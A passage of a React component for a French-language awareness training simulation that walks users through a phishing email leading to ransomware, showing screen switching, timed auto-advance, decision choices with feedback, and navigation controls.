    const positions = [{ x: 55, y: 42 }, { x: 50, y: 35 }, { x: 58, y: 42 }, { x: 52, y: 38 }];
    let i = 0;
    const interval = setInterval(() => {
      setCursorPos(positions[i % positions.length]);
      i++;
    }, 1800);
    return () => clearInterval(interval);
  }, [act.screenType]);

  // Auto-advance
  useEffect(() => {
    setChoiceResult(null);
    setCanAdvance(false);
    if (autoRef.current) clearTimeout(autoRef.current);
    if (act.autoAdvance && act.autoAdvance > 0) {
      autoRef.current = setTimeout(() => setCanAdvance(true), act.autoAdvance);
    } else if (!act.choices) {
      setCanAdvance(true);
    }
    return () => { if (autoRef.current) clearTimeout(autoRef.current); };
  }, [actIndex, act.autoAdvance, act.choices]);

  const handleChoice = useCallback((choice: Choice) => {
    setUserChoices(prev => ({ ...prev, [act.id]: choice.id }));
    setChoiceResult({ correct: choice.correct, feedback: choice.feedback });
    setTimeout(() => setCanAdvance(true), 600);
  }, [act.id]);

  const advance = () => {
    if (actIndex < ACTS.length - 1) {
      setActIndex(i => i + 1);
      setChoiceResult(null);
    }
  };

  const screenType = act.screenType === 'bilan_good' || act.screenType === 'bilan_bad'
    ? (bilanGood ? 'bilan_good' : 'bilan_bad')
    : act.screenType;

  const renderScreen = () => {
    switch (screenType) {
      case 'inbox': return <InboxScreen cursorPos={cursorPos} />;
      case 'attachment': return <AttachmentScreen />;
      case 'terminal': return <TerminalScreen lines={act.terminalLines || []} />;
      case 'encrypting': return <EncryptingScreen />;
      case 'ransom': return <RansomScreen />;
      case 'bilan_good': return <BilanScreen good={true} />;
      case 'bilan_bad': return <BilanScreen good={false} />;
      default: return <TerminalScreen lines={act.terminalLines || []} />;
    }
  };

  return (
    <div style={{ minHeight: '100vh', background: T.bg, fontFamily: T.SANS, color: T.text }}>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap');
        * { box-sizing: border-box; }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: #e8eaed; }
      `}</style>

      {/* Top bar */}
      <div style={{ borderBottom: `1px solid ${T.line}`, padding: '12px 32px', display: 'flex', alignItems: 'center', gap: 16, position: 'sticky', top: 0, background: T.bg, zIndex: 50 }}>
        <button onClick={() => navigate('/cyber/sas-academie')} style={{ display: 'flex', alignItems: 'center', gap: 6, background: 'none', border: 'none', cursor: 'pointer', color: T.muted, fontSize: 10, fontFamily: T.MONO, padding: 0 }}>
          <ChevronLeft size={12} /> Retour Cyber Académie
        </button>
        <div style={{ width: 1, height: 16, background: T.line }} />
        <span style={{ fontFamily: T.MONO, fontSize: 10, color: T.blue, textTransform: 'uppercase', letterSpacing: '0.1em' }}>MISE EN SITUATION — PHISHING → RANSOMWARE</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: 6 }}>
          {ACTS.map((_, i) => (
            <div key={i} style={{ width: i === actIndex ? 20 : 6, height: 6, background: i < actIndex ? T.blue : i === actIndex ? T.blue : T.line, transition: 'all 0.3s ease' }} />
          ))}
        </div>
      </div>

      {/* Main layout */}
      <div style={{ display: 'grid', gridTemplateColumns: '1fr 420px', minHeight: 'calc(100vh - 49px)' }}>

        {/* LEFT — Visual */}
        <div style={{ borderRight: `1px solid ${T.line}`, display: 'flex', flexDirection: 'column' }}>
          {/* Screen */}
          <AnimatePresence mode="wait">
            <motion.div
              key={act.id}
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              transition={{ duration: 0.3 }}
              style={{ flex: 1, minHeight: 480 }}
            >
              {renderScreen()}
            </motion.div>
          </AnimatePresence>

          {/* Chapter badge */}
          <div style={{ borderTop: `1px solid ${T.line}`, padding: '10px 20px', display: 'flex', alignItems: 'center', gap: 10, background: T.surface }}>
            <Zap size={11} color={T.blue} />
            <span style={{ fontFamily: T.MONO, fontSize: 9, color: T.muted, textTransform: 'uppercase', letterSpacing: '0.1em' }}>{act.chapter}</span>
            <span style={{ fontFamily: T.MONO, fontSize: 9, color: T.blue }}>— {act.title}</span>
            {act.autoAdvance && !canAdvance && (
              <span style={{ marginLeft: 'auto', fontFamily: T.MONO, fontSize: 9, color: T.muted }}>
                <motion.span animate={{ opacity: [1, 0.3] }} transition={{ repeat: Infinity, duration: 0.8 }}>● </motion.span>
                simulation en cours...
              </span>
            )}
          </div>
        </div>

        {/* RIGHT — Narrative + choices + knowledge */}
        <div style={{ display: 'flex', flexDirection: 'column', height: 'calc(100vh - 49px)', overflow: 'hidden' }}>
          <div style={{ flex: 1, overflowY: 'auto', padding: '28px 28px 0' }}>

            {/* Chapter + title */}
            <div style={{ marginBottom: 20 }}>
              <span style={{ fontFamily: T.MONO, fontSize: 9, textTransform: 'uppercase', letterSpacing: '0.12em', color: T.muted }}>
                {act.chapter}
              </span>
              <h2 style={{ fontFamily: T.SANS, fontWeight: 800, fontSize: '1.15rem', letterSpacing: '-0.03em', color: T.text, margin: '6px 0 0', lineHeight: 1.25 }}>
                {act.title}
              </h2>
            </div>

            {/* Narrative */}
            <div style={{ marginBottom: 24 }}>
              {act.narrative.map((para, i) => {
                const parts = para.split(/\*\*(.*?)\*\*/g);
                return (
                  <p key={i} style={{ fontSize: 13, color: T.sub, lineHeight: 1.75, margin: '0 0 12px' }}>
                    {parts.map((part, j) =>
                      j % 2 === 1
                        ? <strong key={j} style={{ color: T.text, fontWeight: 600 }}>{part}</strong>
                        : <span key={j}>{part}</span>
                    )}
                  </p>
                );
              })}
            </div>

            {/* Knowledge cards */}
            {act.knowledge && act.knowledge.length > 0 && (
              <div style={{ marginBottom: 24 }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 10 }}>
                  <Info size={11} color={T.blue} />
                  <span style={{ fontFamily: T.MONO, fontSize: 9, textTransform: 'uppercase', letterSpacing: '0.1em', color: T.blue }}>
                    À RETENIR
                  </span>
                </div>
                <KnowledgePanel cards={act.knowledge} />
              </div>
            )}

            {/* Choices */}
            {act.choices && !choiceResult && (
              <div style={{ marginBottom: 24 }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 12 }}>
                  <AlertTriangle size={11} color={T.amber} />
                  <span style={{ fontFamily: T.MONO, fontSize: 9, textTransform: 'uppercase', letterSpacing: '0.1em', color: T.amber }}>
                    À VOUS DE DÉCIDER
                  </span>
                </div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
                  {act.choices.map(choice => (
                    <motion.button
                      key={choice.id}
                      whileHover={{ x: 2 }}
                      onClick={() => handleChoice(choice)}
                      style={{
                        padding: '14px 16px', background: T.bg, border: `1px solid ${T.line}`,
                        cursor: 'pointer', textAlign: 'left', fontFamily: T.SANS, fontSize: 13,
                        color: T.text, lineHeight: 1.4,
                        transition: 'border-color 0.15s',
                      }}
                      onMouseEnter={e => (e.currentTarget.style.borderColor = T.blue)}
                      onMouseLeave={e => (e.currentTarget.style.borderColor = T.line)}
                    >
                      {choice.label}
                    </motion.button>
                  ))}
                </div>
              </div>
            )}

            {/* Choice feedback */}
            <AnimatePresence>
              {choiceResult && (
                <motion.div
                  initial={{ opacity: 0, y: 8 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0 }}
                  style={{
                    padding: 16, marginBottom: 24,
                    background: choiceResult.correct ? 'rgba(16,185,129,0.06)' : 'rgba(239,68,68,0.06)',
                    border: `1px solid ${choiceResult.correct ? T.green : T.red}`,
                    borderLeft: `4px solid ${choiceResult.correct ? T.green : T.red}`,
                  }}
                >
                  <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 8 }}>
                    {choiceResult.correct
                      ? <CheckCircle size={13} color={T.green} />
                      : <XCircle size={13} color={T.red} />}
                    <span style={{ fontFamily: T.MONO, fontSize: 10, fontWeight: 700, color: choiceResult.correct ? T.green : T.red, textTransform: 'uppercase', letterSpacing: '0.06em' }}>
                      {choiceResult.correct ? 'Bonne décision' : 'Mauvaise décision'}
                    </span>
                  </div>
                  <p style={{ fontFamily: T.SANS, fontSize: 12, color: T.sub, lineHeight: 1.65, margin: 0 }}>
                    {choiceResult.feedback}
                  </p>
                </motion.div>
              )}
            </AnimatePresence>

          </div>

          {/* Sticky bottom nav */}
          <div style={{ borderTop: `1px solid ${T.line}`, padding: '16px 28px', background: T.bg, display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 12 }}>
            <button
              onClick={() => actIndex > 0 && setActIndex(i => i - 1)}
              disabled={actIndex === 0}
              style={{ display: 'flex', alignItems: 'center', gap: 6, padding: '9px 14px', background: T.surface, border: `1px solid ${T.line}`, cursor: actIndex === 0 ? 'not-allowed' : 'pointer', opacity: actIndex === 0 ? 0.4 : 1, fontFamily: T.MONO, fontSize: 10, color: T.sub }}
            >
              <ChevronLeft size={12} /> Précédent
            </button>

            {isLast ? (
              <button
                onClick={() => { setActIndex(0); setUserChoices({}); setChoiceResult(null); }}
                style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '10px 22px', background: T.blue, color: '#fff', border: 'none', cursor: 'pointer', fontFamily: T.MONO, fontSize: 11, fontWeight: 600 }}
              >
                <Shield size={12} /> Recommencer
              </button>
            ) : (
              <button
                onClick={advance}
                disabled={!canAdvance}
                style={{
                  display: 'flex', alignItems: 'center', gap: 8,
                  padding: '10px 22px',
                  background: canAdvance ? T.blue : T.surface,
                  color: canAdvance ? '#fff' : T.muted,
                  border: canAdvance ? 'none' : `1px solid ${T.line}`,
                  cursor: canAdvance ? 'pointer' : 'not-allowed',
                  fontFamily: T.MONO, fontSize: 11, fontWeight: 600,
                  transition: 'all 0.2s',
                }}
              >
                {!canAdvance ? (
                  <>
                    <motion.span animate={{ opacity: [1, 0.3] }} transition={{ repeat: Infinity, duration: 0.8 }}>●</motion.span>
                    &nbsp;En cours...
                  </>
                ) : (
                  <>Acte suivant <ChevronRight size={12} /></>
                )}
              </button>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
